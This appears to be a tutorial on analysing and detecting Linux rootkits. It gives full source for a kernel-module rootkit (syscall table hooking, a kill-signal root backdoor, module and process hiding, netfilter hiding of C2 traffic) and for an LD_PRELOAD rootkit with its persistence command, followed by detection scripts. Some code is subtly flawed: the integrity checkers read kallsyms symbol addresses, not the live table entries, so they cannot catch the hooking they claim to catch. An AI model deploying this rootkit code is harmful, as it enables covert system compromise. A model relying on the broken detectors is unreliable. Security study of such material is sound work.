Rootkit Analysis

Analyze Linux rootkits by examining kernel module hooking, system call table tampering, file system manipulation, and user-space library interception.

Overview

A rootkit is software that hides its presence by subverting the operating system mechanisms used to detect it. Linux rootkits work at two levels: kernel-space loadable modules that modify kernel structures, and user-space libraries that intercept the system calls a process makes. This article dissects both, then builds detection tools that compare what the kernel knows with what user-space tools report.

Required Reading

  • System Calls - Linux system call mechanism, syscall table, user->kernel transition
  • Processes - process lifecycle, task_struct, process hiding
  • LD_PRELOAD - userland function hooking via LD_PRELOAD

---

A rootkit is software that hides its presence by subverting the OS mechanisms used to detect it. It manipulates the same kernel structures that tools like ps , ls , netstat , and ss rely on. If ps reads /proc to list processes, the rootkit intercepts that read and removes its own PID from the output. The defining characteristic of a rootkit is not what it does (backdoor, keylogger, DDoS ) but that it actively hides evidence of its existence.

Rootkits operate at two levels: kernel-space (LKM - Loadable Kernel Module, modifies kernel memory and structures) and user-space (LD_PRELOAD, ptrace, or shared library replacement). The analysis approach differs fundamentally between the two.

Kernel vs Userland Rootkits

Property Kernel-Level Rootkit Userland Rootkit (LD_PRELOAD)
Privilege required Root (insmod / modprobe) Root (write /etc/ld.so.preload) or User
Persistence mechanism Installs kernel module, hooks kernel structs Writes to /etc/ld.so.preload,~/.bashrc
Visibility Invisible to userland tools Partially visible (kernel still reports truth)
Hiding capability Processes, files, connections, modules, ports Processes (via /proc), files (via readdir), connections
Detection difficulty High - need kernel-level introspection Medium - compare kernel vs userland views
Performance impact Minimal - runs in kernel context Per-process overhead (hooked libc calls)
Stability risk High - kernel bug = kernel panic Low - crashes affect only hooked process
/proc/modulesimpact Module hidden from listing No effect on kernel modules
/proc/kallsymsimpact Symbols can be hidden (if kptr_restrict=0) No effect on kernel symbols

Kernel Rootkit Architecture

An LKM rootkit has three phases:

  1. Module load ( init_module ): locate kernel structures, save original function pointers, install hooks
  2. Operational phase : hooks intercept specific events, filter results before returning to userspace
  3. Module unload ( cleanup_module ): restore original function pointers (few rootkits implement this properly - many crash the kernel on unload)

Finding the sys_call_table

The sys_call_table is an array of function pointers, one per system call number. Historically it was exported via kallsyms : 

/* /proc/kallsyms entry (on kernels with kptr_restrict=0):
 * ffffffff820001e0 R sys_call_table
 */

/* But modern kernels unexport it. Rootkits find it by:
 *   1. Scanning kernel .text for syscall handler prototypes
 *   2. Reading /proc/kallsyms (if kptr_restrict permits)
 *   3. Using kallsyms_lookup_name() (if exported)
 *   4. Following the MSR_LSTAR (x86_64 syscall entry point)
 */

// Modern rootkit approach: find via MSR
#include <asm/msr.h>

static unsigned long *find_sys_call_table(void)
{
    unsigned long syscall_entry;
    rdmsrl(MSR_LSTAR, syscall_entry);

    /* The entry point (entry_SYSCALL_64) contains:
     *   call *sys_call_table(, %rax, 8)
     * The bytes are: ff 14 c5 XX XX XX XX
     * where XX XX XX XX is the address of sys_call_table
     */

    unsigned char *code = (unsigned char *)syscall_entry;

    for (unsigned int i = 0; i < 0x200; i++) {
        /* Look for 'call *sys_call_table(,%rax,8)' = ff 14 c5 <disp32> */
        if (code[i] == 0xff && code[i + 1] == 0x14 && code[i + 2] == 0xc5) {
            /* The disp32 immediately after the opcode is the table address */
            unsigned int table_addr;
            memcpy(&table_addr, code + i + 3, sizeof(table_addr));
            return (unsigned long *)table_addr;
        }
    }

    return NULL;
}

The bytes 'ff 14 c5' correspond to

ff 14 c5 <4-byte-absolute-address>
= CALL r/m64  (opcode FF /2) with SIB byte 14 c5
14 c5 = Scale=8, Index=RAX, Base=None (absolute addressing)
-> This is the encoding for: call *sys_call_table(, %rax, 8)

Syscall Table Hooking

Once the table address is found, overwrite an entry:

/*
 * basic_rootkit.c - syscall table hook demonstration
 *
 * This is a CONCEPTUAL example. Actual kernel module compilation
 * requires kernel headers matching the running kernel:
 *   pacman -S linux-headers
 *   make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
 *
 * The module demonstrates the syscall hooking principle.
 * DO NOT load unsigned kernel modules on production systems.
 */

#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/cred.h>
#include <linux/sched.h>
#include <linux/pid.h>
#include <linux/string.h>
#include <linux/version.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("RE Analysis Lab");
MODULE_DESCRIPTION("Syscall hooking rootkit - analysis artifact");

/* Original syscall function pointers */
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* The actual sys_call_table address (found at runtime) */
static unsigned long *sys_call_table = NULL;

/* ── Syscall table discovery ─────────────────────────────────────────── */

static unsigned long *find_syscall_table(void)
{
    /* In kernel modules, use kallsyms_lookup_name if available */
    /* On older kernels (pre-5.7), sys_call_table was exported: */
    #ifdef CONFIG_KALLSYMS
        /* kallsyms_lookup_name was unexported in 5.7; need kprobes */
        #include <linux/kprobes.h>

        typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
        static kallsyms_lookup_name_t lookup;

        struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };
        if (register_kprobe(&kp) < 0) return NULL;
        lookup = (kallsyms_lookup_name_t)kp.addr;
        unregister_kprobe(&kp);

        unsigned long *table = (unsigned long *)lookup("sys_call_table");
        return table;
    #else
        return NULL;
    #endif
}

/* After 5.7, rootkits use kprobes or manual disassembly of entry_SYSCALL_64 */

/* ── Hiding a process from ps / /proc ────────────────────────────────── */

asmlinkage long hooked_getdents64(const struct pt_regs *regs)
{
    long ret = orig_getdents64(regs);

    if (ret <= 0) return ret;

    /* Walk the dirent buffer returned by the kernel */
    struct linux_dirent64 *dir, *prev = NULL, *kdirent;
    unsigned long offset = 0;

    kdirent = kzalloc(ret, GFP_KERNEL);
    if (!kdirent) return ret;

    /* Copy the returned buffer from userspace to kernel space */
    if (copy_from_user(kdirent, (void __user *)regs->si, ret)) {
        kfree(kdirent);
        return ret;
    }

    while (offset < ret) {
        dir = (struct linux_dirent64 *)((char *)kdirent + offset);

        /* If this directory entry is our hidden process directory */
        if (strstr(dir->d_name, "hidden_proc_name") != NULL) {
            if (prev) {
                /* Remove this entry by extending the previous one */
                prev->d_reclen += dir->d_reclen;
            } else {
                /* First entry - set d_ino to 0 (invalidates entry) */
                dir->d_ino = 0;
            }
        } else {
            prev = dir;
        }

        offset += dir->d_reclen;
    }

    /* Copy the sanitized buffer back to userspace */
    if (copy_to_user((void __user *)regs->si, kdirent, ret)) {
        kfree(kdirent);
        return ret;
    }

    kfree(kdirent);
    return ret;
}

/* ── Magic packet backdoor ───────────────────────────────────────────── */

static unsigned int magic_port = 31337;
static unsigned char magic_packet[] = { 0xde, 0xad, 0xbe, 0xef };

asmlinkage long hooked_kill(const struct pt_regs *regs)
{
    /* Use the kill() syscall as a covert channel:
     *   kill(<magic_pid>, <magic_sig>) -> trigger action
     * Rootkits often use kill(0, SIG<magic>) or specific signals
     * to trigger backdoor actions: spawn reverse shell, grant root
     */

    pid_t pid = (pid_t)regs->di;   /* arg1 = pid */
    int   sig = (int)regs->si;     /* arg2 = signal */

    /* Magic signal 64 -> give caller root */
    if (sig == 64 && pid == task_tgid_vnr(current)) {
        struct cred *new = prepare_kernel_cred(NULL);
        if (new) {
            new->uid.val = new->gid.val = 0;
            new->euid.val = new->egid.val = 0;
            new->suid.val = new->sgid.val = 0;
            new->fsuid.val = new->fsgid.val = 0;
            commit_creds(new);
        }
        return 0;  /* Don't deliver the actual signal */
    }

    /* Pass through to original handler */
    return orig_kill(regs);
}

/* ── Module init / exit ──────────────────────────────────────────────── */

static int __init rootkit_init(void)
{
    /* Disable write protection on the syscall table page */
    unsigned long cr0;
    cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);  /* Clear WP (Write Protect) bit in CR0 */

    sys_call_table = find_syscall_table();
    if (!sys_call_table) {
        write_cr0(cr0);  /* Restore WP */
        printk(KERN_ERR "rootkit: cannot find sys_call_table\n");
        return -EFAULT;
    }

    /* Save original handlers */
    orig_getdents64 = (void *)sys_call_table[__NR_getdents64];
    orig_kill        = (void *)sys_call_table[__NR_kill];

    /* Install hooks */
    sys_call_table[__NR_getdents64] = (unsigned long)hooked_getdents64;
    sys_call_table[__NR_kill]        = (unsigned long)hooked_kill;

    /* Restore write protection */
    write_cr0(cr0);

    printk(KERN_INFO "rootkit: loaded, syscall table hooked\n");
    return 0;
}

static void __exit rootkit_exit(void)
{
    unsigned long cr0 = read_cr0();
    write_cr0(cr0 & ~0x10000);

    if (sys_call_table) {
        sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
        sys_call_table[__NR_kill]        = (unsigned long)orig_kill;
    }

    write_cr0(cr0);
    printk(KERN_INFO "rootkit: unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);

The CR0 write-protect manipulation is necessary because the sys_call_table resides in read-only memory. Clearing bit 16 (WP flag) temporarily allows the kernel to write to read-only pages. This is a legacy technique - modern rootkits use text_poke_bp or kprobes to avoid CR0 manipulation.

VFS Hooking

A stealthier approach than syscall table modification: hook Virtual File System operations instead. VFS hooks are function pointers in struct file_operations and struct inode_operations - manipulating these is harder to detect than syscall table entries. 

/*
 * VFS-based file hiding rootkit (conceptual)
 *
 * Replaces the readdir file_operation of the proc filesystem
 * to hide process directory entries. More targeted than
 * syscall hooking - only affects /proc reads, not ls /home.
 */

#include <linux/fs.h>
#include <linux/proc_fs.h>

typedef int (*filldir_t)(void *, const char *, int, loff_t, u64, unsigned);

static filldir_t orig_filldir = NULL;

static int hooked_filldir(void *ctx, const char *name, int namelen,
                          loff_t offset, u64 ino, unsigned d_type)
{
    /* Hide entries matching our rootkit's process name */
    if (strstr(name, "hidden_process"))
        return 0;  /* Skip this entry - never add to directory listing */

    return orig_filldir(ctx, name, namelen, offset, ino, d_type);
}

/* To hook /proc's filldir, the rootkit would:
 *   1. Locate the proc filesystem's superblock
 *   2. Traverse to the directory inode for /proc
 *   3. Replace the filldir callback in the file_operations
 * This requires deep kernel structure traversal.
 */

Module Hiding (Concealing from lsmod)

lsmod reads /proc/modules , which is populated by iterating the modules linked list in kernel memory. A rootkit removes itself from this list: 

/* Before hiding: lsmod shows the module
 * Module                  Size  Used by
 * rootkit                16384  0
 *
 * After hiding: module absent from lsmod output
 * (But still loaded - /sys/module/<name> still exists)
 */

static struct list_head *prev_module_node;

static void hide_module(void)
{
    /* Remove from the modules linked list */
    /* In kernels where THIS_MODULE->list is still accessible: */
    prev_module_node = THIS_MODULE->list.prev;  /* Save for unhiding */
    list_del(&THIS_MODULE->list);

    /* Zero out module information to defeat /sys/module introspection */
    memset(&THIS_MODULE->name, 0, sizeof(THIS_MODULE->name));
    THIS_MODULE->state = MODULE_STATE_UNFORMED;

    /* Note: THIS_MODULE->list is no longer accessible in modern kernels
     * (kernel lockdown). Malware uses alternate structures or
     * manipulates the kobject sysfs visibility instead. */
}

Netfilter Hooking

Rootkits hook netfilter to hide C2 connections: 

#include <linux/netfilter.h>
#include <linux/netfilter_ipv4.h>
#include <linux/ip.h>
#include <linux/tcp.h>

static struct nf_hook_ops nfho;

static unsigned int hook_packet(void *priv, struct sk_buff *skb,
                                const struct nf_hook_state *state)
{
    struct iphdr *iph = ip_hdr(skb);

    if (iph->protocol == IPPROTO_TCP) {
        struct tcphdr *tcph = tcp_hdr(skb);

        /* Hide packets from/to our C2 port (31337) */
        if (ntohs(tcph->source) == 31337 || ntohs(tcph->dest) == 31337)
            return NF_DROP;  /* Silently drop - connection is invisible */

        /* More sophisticated: redirect C2 packets to loopback */
        /* So ss/netstat sees a localhost connection instead of external */
    }

    return NF_ACCEPT;
}

/* Registration in init_module():
 * nfho.hook     = hook_packet;
 * nfho.pf       = PF_INET;
 * nfho.hooknum  = NF_INET_PRE_ROUTING;
 * nfho.priority = NF_IP_PRI_FIRST;
 * nf_register_net_hook(&init_net, &nfho);
 */

Process Hiding Via task_struct

Processes in Linux are tracked by a doubly-linked list of task_struct nodes. ps and /proc iterate this list. Removing a task_struct from the list hides the process: 

/*
 * Process hiding by task_struct list removal (conceptual)
 *
 * The init_task is the root of the task list.
 * Each task_struct has:
 *   struct list_head tasks;    // links to next/prev process
 *   struct list_head children; // child processes
 *   struct list_head sibling;  // sibling processes
 *
 * Removing a task_struct from 'tasks' makes it invisible to
 * for_each_process() - which means invisible to ps and /proc enumeration.
 * However, the process itself continues running (scheduled by PID, not list).
 */

static void hide_task(pid_t pid)
{
    struct task_struct *task;

    for_each_process(task) {  /* This iterates the 'tasks' list */
        if (task->pid == pid) {
            list_del(&task->tasks);   /* Remove from the global list */
            /* Process now invisible to ps, but still runnable */
            return;
        }
    }
}

Detection of hidden processes

# Method 1: Compare /proc with ps output
ls -d /proc/[0-9]* | wc -l          # Count all PIDs visible in /proc
ps aux | wc -l                      # Count processes visible to ps
# If /proc count > ps count, a rootkit is filtering ps

# Method 2: PID bruteforce
for pid in $(seq 1 65535); do
    if [ -d "/proc/$pid" ] && ! ps -p "$pid" >/dev/null 2>&1; then
        echo "Hidden process: PID $pid"
        cat /proc/$pid/cmdline 2>/dev/null | tr '\0' ' '
        echo
    fi
done

# Method 3: Kill signal test
for pid in $(ls -d /proc/[0-9]* 2>/dev/null | cut -d/ -f3); do
    kill -0 "$pid" 2>/dev/null || echo "Process $pid exists in /proc but not killable"
done

Userland Rootkit Analysis

Userland rootkits hook libc functions via LD_PRELOAD or library replacement. They are simpler but easier to detect.

libc Function Hooking

/*
 * userland_rootkit.c - LD_PRELOAD-based process/file/connection hiding
 *
 * Compile:
 *   gcc -shared -fPIC -fno-builtin -o libreplace.so userland_rootkit.c -ldl -lcap
 *
 * Install (malicious persistence):
 *   echo "/usr/lib/libreplace.so" >> /etc/ld.so.preload
 *
 * Effect: every process on the system now filters its own view of reality.
 */

#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/types.h>

/* ── Get original function pointers ──────────────────────────────────── */

static struct dirent *(*orig_readdir)(DIR *dirp) = NULL;
static struct dirent64 *(*orig_readdir64)(DIR *dirp) = NULL;
static int (*orig_open)(const char *, int, ...) = NULL;
static int (*orig_stat)(int, const char *, struct stat *) = NULL;
static int (*orig_stat64)(int, const char *, struct stat64 *) = NULL;
static int (*orig_lstat)(const char *, struct stat *) = NULL;

/* Lists of strings to hide */
static const char *hidden_files[] = {
    "rootkit.so",
    "hidden_binary",
    "malware_config",
    "drop_payload",
    NULL
};

static const char *hidden_prefixes[] = {
    "/proc/",     /* Hide /proc entries matching our PIDs */
    NULL
};

__attribute__((constructor))
static void init(void)
{
    orig_readdir   = (void *)dlsym(RTLD_NEXT, "readdir");
    orig_readdir64 = (void *)dlsym(RTLD_NEXT, "readdir64");
    orig_open      = (void *)dlsym(RTLD_NEXT, "open");
    orig_stat      = (void *)dlsym(RTLD_NEXT, "__xstat");
    orig_stat64    = (void *)dlsym(RTLD_NEXT, "__xstat64");
    orig_lstat     = (void *)dlsym(RTLD_NEXT, "__lxstat");
}

/* ── Hide files from directory listings ──────────────────────────────── */

static int should_hide_filename(const char *name)
{
    for (int i = 0; hidden_files[i]; i++) {
        if (strstr(name, hidden_files[i]))
            return 1;
    }
    return 0;
}

struct dirent *readdir(DIR *dirp)
{
    struct dirent *ent;
    while ((ent = orig_readdir ? orig_readdir(dirp) : NULL) != NULL) {
        if (!should_hide_filename(ent->d_name))
            return ent;
        /* Entry hidden - continue to next */
    }
    return NULL;
}

struct dirent64 *readdir64(DIR *dirp)
{
    struct dirent64 *ent;
    while ((ent = orig_readdir64 ? orig_readdir64(dirp) : NULL) != NULL) {
        if (!should_hide_filename(ent->d_name))
            return ent;
    }
    return NULL;
}

/* ── Hide files from stat/open ───────────────────────────────────────── */

static int should_hide_path(const char *path)
{
    if (!path) return 0;
    for (int i = 0; hidden_files[i]; i++) {
        if (strstr(path, hidden_files[i]))
            return 1;
    }
    /* Also hide /proc/<our_pid>/* entries */
    return 0;
}

int open(const char *pathname, int flags, ...)
{
    if (should_hide_path(pathname)) {
        errno = ENOENT;
        return -1;
    }
    return orig_open ? orig_open(pathname, flags) : -1;
}

int __xstat(int ver, const char *path, struct stat *buf)
{
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig_stat ? orig_stat(ver, path, buf) : -1;
}

int __lxstat(int ver, const char *path, struct stat *buf)
{
    if (should_hide_path(path)) {
        errno = ENOENT;
        return -1;
    }
    return orig_lstat ? orig_lstat(ver, path, buf) : -1;
}

Python: sys_call_table Integrity Check

A userspace script that reads /proc/kallsyms and detects anomalies: 

#!/usr/bin/env python3
"""
sct_check.py - sys_call_table integrity verifier

Reads /proc/kallsyms and checks that all syscall handler addresses
point within the kernel's .text segment, not to module code regions.

Usage: sudo python3 sct_check.py
"""

import re
import sys
import struct
import subprocess

def read_kallsyms():
    """Parse /proc/kallsyms into {name: address}."""
    syms = {}
    try:
        with open('/proc/kallsyms') as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 3:
                    addr = int(parts[0], 16)
                    name = parts[2]
                    syms[name] = addr
    except PermissionError:
        print("[-] /proc/kallsyms requires root (or set kernel.kptr_restrict=0)")
        sys.exit(1)
    return syms

def find_kernel_text_range(syms):
    """Determine the kernel .text segment range."""
    text_start = syms.get('_text')
    text_end   = syms.get('_etext')
    if not text_start or not text_end:
        return None, None
    return text_start, text_end

def find_syscall_table(syms):
    """Locate sys_call_table address."""
    return syms.get('sys_call_table')

def is_module_address(addr, syms):
    """Check if an address falls within a kernel module range."""
    # Modules typically load above 0xffffffffc0000000 on x86_64
    # or in the vmalloc area. Check against known module init/text markers.
    for name, module_addr in syms.items():
        if name.startswith('__init_begin') or name.startswith('__start___ex_table'):
            continue
        # Module addresses tend to be below kernel text on recent kernels
        pass
    return False

def main():
    syms = read_kallsyms()

    sct_addr = find_syscall_table(syms)
    if not sct_addr:
        print("[-] sys_call_table not found in kallsyms")
        sys.exit(1)
    print(f"[+] sys_call_table @ 0x{sct_addr:x}")

    text_start, text_end = find_kernel_text_range(syms)
    if text_start and text_end:
        print(f"[+] Kernel .text: 0x{text_start:x} - 0x{text_end:x}")
    else:
        print("[-] Cannot determine kernel .text range")
        sys.exit(1)

    # syscall name -> number mapping (x86_64)
    syscall_names = {
        0: "__x64_sys_read",
        1: "__x64_sys_write",
        2: "__x64_sys_open",
        3: "__x64_sys_close",
        4: "__x64_sys_stat",
        5: "__x64_sys_fstat",
        6: "__x64_sys_lstat",
        7: "__x64_sys_poll",
        8: "__x64_sys_lseek",
        9: "__x64_sys_mmap",
        10: "__x64_sys_mprotect",
        11: "__x64_sys_munmap",
        12: "__x64_sys_brk",
        # ... truncated for brevity; full table has 335+ entries
        59: "__x64_sys_execve",
        62: "__x64_sys_kill",
        217: "__x64_sys_getdents64",
        231: "__x64_sys_exit_group",
    }

    print("\n[+] Checking syscall handler addresses:")
    suspicious = 0
    for nr, name in sorted(syscall_names.items()):
        expected = syms.get(name)
        if not expected:
            print(f"  [{nr:3d}] {name:30s} -> NOT FOUND in kallsyms")
            suspicious += 1
            continue

        if not (text_start <= expected <= text_end):
            print(f"  [{nr:3d}] {name:30s} -> 0x{expected:x} OUTSIDE .text! SUSPICIOUS")
            suspicious += 1

    if suspicious == 0:
        print("  All handlers within kernel .text - no syscall table anomalies detected.")
    else:
        print(f"\n[!] {suspicious} anomalies detected - possible syscall hooking!")

    # Check for hidden modules
    print("\n[+] Checking for hidden kernel modules:")
    try:
        proc_modules = subprocess.check_output(['cat', '/proc/modules']).decode()
        proc_count = len([l for l in proc_modules.strip().split('\n') if l.strip()])

        sys_modules = subprocess.check_output(['ls', '/sys/module']).decode()
        sys_count = len([l for l in sys_modules.strip().split('\n') if l.strip()])

        print(f"  /proc/modules: {proc_count} modules")
        print(f"  /sys/module:   {sys_count} modules")
        if proc_count < sys_count:
            print(f"  [!] {sys_count - proc_count} module(s) hidden from /proc/modules!")
            # Find the hidden ones:
            proc_set = set()
            for line in proc_modules.strip().split('\n'):
                proc_set.add(line.split()[0])
            for m in sys_modules.strip().split('\n'):
                if m not in proc_set:
                    print(f"  [!] Hidden module: {m}")
        else:
            print("  No hidden modules detected.")
    except Exception as e:
        print(f"  [-] Error: {e}")

if __name__ == '__main__':
    main()

Diamorphine Rootkit Analysis

Diamorphine is a well-known open-source LKM rootkit. Its architecture demonstrates all the core techniques: 

Diamorphine module structure:
├── init_module()
│   ├── Locate sys_call_table via kallsyms_lookup_name or MSR_LSTAR
│   ├── Find the target syscall handlers by reading kallsyms
│   ├── Save original: kill, getdents, getdents64
│   ├── Write hook: replace sys_call_table entries
│   └── Register a netlink socket (for remote control)
│
├── hooked_kill()
│   ├── signal 64 -> give_root()    (caller gets uid=0, gid=0)
│   ├── signal 63 -> hide_module()  (module removes itself from /proc/modules)
│   └── signal 62 -> show_module()  (module re-inserts itself)
│
├── hooked_getdents()  / hooked_getdents64()
│   └── Filter directory entries to hide files/processes matching prefix
│
├── clean_routine()  (registered via netlink)
│   └── Hide/unhide TCP4 and TCP6 connections from /proc/net/tcp
│
└── cleanup_module()
    └── Restore syscall table entries, unregister netlink hooks

Rootkit Detection Workflow

#!/bin/bash
# rootkit_audit.sh - comprehensive rootkit detection

echo "=== 1. LD_PRELOAD check ==="
cat /etc/ld.so.preload 2>/dev/null || echo "(none)"

echo -e "\n=== 2. Hidden process check ==="
PROC_COUNT=$(ls -d /proc/[0-9]* 2>/dev/null | wc -l)
PS_COUNT=$(ps aux 2>/dev/null | wc -l)
echo "/proc entries: $PROC_COUNT"
echo "ps entries:    $PS_COUNT"
[ "$PROC_COUNT" -gt "$PS_COUNT" ] && echo "[!] WARNING: $((PROC_COUNT - PS_COUNT)) processes hidden!"

echo -e "\n=== 3. Hidden module check ==="
PROC_MOD=$(cat /proc/modules 2>/dev/null | wc -l)
SYS_MOD=$(ls /sys/module 2>/dev/null | wc -l)
echo "/proc/modules: $PROC_MOD"
echo "/sys/module:   $SYS_MOD"
[ "$SYS_MOD" -gt "$PROC_MOD" ] && echo "[!] WARNING: $((SYS_MOD - PROC_MOD)) modules hidden!"

echo -e "\n=== 4. sys_call_table check ==="
python3 sct_check.py 2>/dev/null

echo -e "\n=== 5. Hidden file check ==="
# Create a file with known name, check if it's visible:
HIDDEN_TEST="/tmp/.rootkit_test_$$"
echo "test" > "$HIDDEN_TEST"
if [ -f "$HIDDEN_TEST" ]; then
    FOUND=$(ls /tmp/ 2>/dev/null | grep "rootkit_test_$$")
    if [ -z "$FOUND" ]; then
        echo "[!] WARNING: File exists but is hidden from directory listing!"
    else
        echo "No file hiding detected"
    fi
    rm -f "$HIDDEN_TEST"
fi

echo -e "\n=== 6. Connection hiding check ==="
# Listen on a test port, check if it appears in ss output:
python3 -c "
import socket
s = socket.socket()
s.bind(('127.0.0.1', 41337))
s.listen(1)
" &
PID=$!
sleep 0.5
ss -tlnp | grep 41337 > /dev/null && echo "Port 41337 visible" || echo "[!] Port 41337 HIDDEN!"
kill $PID 2>/dev/null

echo -e "\n=== 7. Suspicious loaded modules ==="
lsmod | awk '{print $1}' | while read m; do
    # Check ownership
    modinfo "$m" 2>/dev/null | grep -q 'filename' || continue
    AUTHOR=$(modinfo "$m" 2>/dev/null | grep author | awk '{$1=""; print $0}')
    DESC=$(modinfo "$m" 2>/dev/null | grep description | awk '{$1=""; print $0}')
    # Flag suspicious fields
    echo "$AUTHOR" | grep -qiE 'kernel team|system' && echo "[!] SUSPICIOUS: $m - fake author: $AUTHOR"
    echo "$DESC" | grep -qiE 'utility|helper|driver|service' && echo "[!] SUSPICIOUS: $m - generic description: $DESC"
done

The key insight: kernel-level rootkits affect all tools, userland rootkits only affect dynamically-linked tools. A statically-linked ls (compiled with -static ) bypasses any LD_PRELOAD hook because it calls the kernel directly via syscall(SYS_getdents, ...) .

Summary

Linux rootkits manipulate the boundary between the kernel's truth and userland's perception. Kernel rootkits hook sys_call_table, VFS operations, netfilter, or task_struct lists to filter the kernel's own output before it reaches userspace. Userland rootkits hook libc functions to filter the userspace view of kernel data. Detection requires comparing multiple views of the same data: /proc vs /sys , ps vs /proc PID bruteforce, dynamic vs static tooling. The sys_call_table integrity check - verifying that every handler address falls within the kernel .text segment - catches the most common kernel hooking technique. A statically-linked binary that makes raw syscalls exposes userland rootkits by showing files and processes that the hooked libc hides. No single detection method catches every rootkit, but layered comparison reveals the inconsistencies that rootkits inevitably create.

Challenge

Write a Go tool that finds hidden kernel modules by comparing two views of the same kernel: the list in /proc/modules and the directories under /sys/module . Any module present in one but not the other is being hidden. Extend the tool to read /proc/kallsyms , record the kernel _text and _etext boundaries, and flag every __x64_sys_* handler whose address falls outside that range. Run it on a clean system, then load a harmless test module and hide it from /proc/modules to confirm the detector fires. 

package main

import (
	"bufio"
	"fmt"
	"os"
	"strings"
)

func modulesFromProc() map[string]bool {
	found := make(map[string]bool)

	file, err := os.Open("/proc/modules")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) > 0 {
			found[fields[0]] = true
		}
	}

	return found
}

func modulesFromSys() map[string]bool {
	found := make(map[string]bool)

	entries, err := os.ReadDir("/sys/module")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	for _, entry := range entries {
		found[entry.Name()] = true
	}

	return found
}

func main() {
	proc := modulesFromProc()
	sys := modulesFromSys()

	fmt.Printf("proc modules: %d, sys modules: %d\n", len(proc), len(sys))

	for name := range sys {
		if !proc[name] {
			fmt.Printf("[!] hidden from /proc/modules: %s\n", name)
		}
	}

	file, err := os.Open("/proc/kallsyms")
	if err != nil {
		fmt.Fprintln(os.Stderr, err)
		os.Exit(1)
	}
	defer file.Close()

	type symbol struct {
		addr uint64
		name string
	}

	var textStart, textEnd uint64
	var handlers []symbol

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		fields := strings.Fields(scanner.Text())
		if len(fields) < 3 {
			continue
		}

		var addr uint64
		fmt.Sscanf(fields[0], "%x", &addr)

		switch fields[2] {
		case "_text":
			textStart = addr
		case "_etext":
			textEnd = addr
		}
		if strings.HasPrefix(fields[2], "__x64_sys_") {
			handlers = append(handlers, symbol{addr, fields[2]})
		}
	}

	if textStart == 0 || textEnd == 0 {
		return
	}
	for _, handler := range handlers {
		if handler.addr < textStart || handler.addr > textEnd {
			fmt.Printf("[!] %s at 0x%x outside kernel text\n", handler.name, handler.addr)
		}
	}
}
